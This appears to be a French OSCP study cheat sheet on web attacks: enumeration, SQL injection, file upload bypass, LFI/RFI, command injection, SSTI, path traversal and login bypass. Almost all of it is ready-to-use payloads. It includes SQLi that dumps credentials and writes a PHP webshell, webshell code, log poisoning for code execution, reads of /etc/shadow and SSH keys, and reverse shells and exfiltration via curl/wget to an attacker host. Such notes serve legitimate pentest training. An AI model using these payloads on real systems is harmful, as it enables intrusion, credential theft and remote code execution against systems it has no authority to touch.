# 05 — Web

## 1. Énumération web

```bash
# Répertoires
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,xml
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Virtual hosts
gobuster vhost -u http://<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<IP> -H "Host: FUZZ.<domain>"

# Fichiers sensibles
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,old,txt,conf,zip

# Nikto
nikto -h http://<IP>

# Toujours vérifier manuellement
curl -I http://<IP>                                # headers
curl -s http://<IP>/robots.txt
curl -s http://<IP>/sitemap.xml
# View source de chaque page
```

---

## 2. SQLi

```bash
# Test basique
' OR '1'='1
' OR 1=1--
" OR 1=1--
admin'--

# SQLMap (interdit à l'exam mais utile en lab)
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
sqlmap -u "http://<IP>/page?id=1" -D <db> -T <table> --dump

# SQLi manuelle — UNION based
# 1. Trouver nombre de colonnes
' ORDER BY 1--
' ORDER BY 2--   ... jusqu'à erreur

# 2. Identifier colonnes affichées
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--

# 3. Extraire données
' UNION SELECT username,password,NULL FROM users--

# SQLi — lire fichiers (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

# SQLi — écrire webshell (MySQL, si droits FILE)
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 3. File Upload

```bash
# Extensions à tester
shell.php
shell.php5
shell.php7
shell.phtml
shell.pHp
shell.PhP

# Bypass Content-Type
# Modifier le header : Content-Type: image/jpeg dans Burp

# Bypass double extension
shell.php.jpg
shell.jpg.php

# Bypass magic bytes
# Ajouter GIF89a; au début du fichier PHP

# Webshell basique PHP
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

# Après upload → trouver où le fichier est accessible
# /uploads/ /files/ /media/ /images/
```

---

## 4. LFI / RFI

```bash
# LFI basique
http://<IP>/page?file=../../../etc/passwd
http://<IP>/page?file=....//....//....//etc/passwd
http://<IP>/page?file=/etc/passwd%00          # null byte (vieux PHP)

# Fichiers intéressants à lire
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log                   # log poisoning
/var/log/nginx/access.log
~/.ssh/id_rsa
~/.bash_history
/var/www/html/config.php

# Log Poisoning → RCE
# 1. Injecter dans User-Agent :
<?php system($_GET['cmd']); ?>
# 2. Inclure le log :
?file=/var/log/apache2/access.log&cmd=id

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php    # lire source
php://input                                               # RFI via POST
data://text/plain;base64,<base64_php_code>               # RCE
```

---

## 5. Command Injection

```bash
# Test
; id
| id
&& id
`id`
$(id)

# Blind command injection
; ping -c 3 <KALI>
; curl http://<KALI>/<output>
; wget http://<KALI>/$(id)

# Reverse shell via command injection
; bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'
; /bin/bash -i >& /dev/tcp/<KALI>/4444 0>&1
```

---

## 6. SSTI (Server-Side Template Injection)

```bash
# Test
{{7*7}}           → 49 = vulnérable (Jinja2, Twig)
${7*7}            → 49 = vulnérable (FreeMarker)
<%= 7*7 %>        → 49 = vulnérable (ERB)

# RCE Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# RCE Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## 7. Path Traversal / Arbitrary File Read

```bash
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd           # double encoding
....//....//....//etc/passwd
```

---

## 8. Authentification bypass

```bash
# Credentials par défaut à tester
admin:admin
admin:password
admin:123456
admin:(blank)
root:root
guest:guest

# SQLi bypass login
' OR '1'='1'--
admin'--
' OR 1=1--

# JWT
# Decoder sur jwt.io
# Tester algorithme "none"
# Bruteforce secret avec hashcat
hashcat -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
```

---

## Tags
#oscp #web #sqli #lfi #rfi #upload #ssti
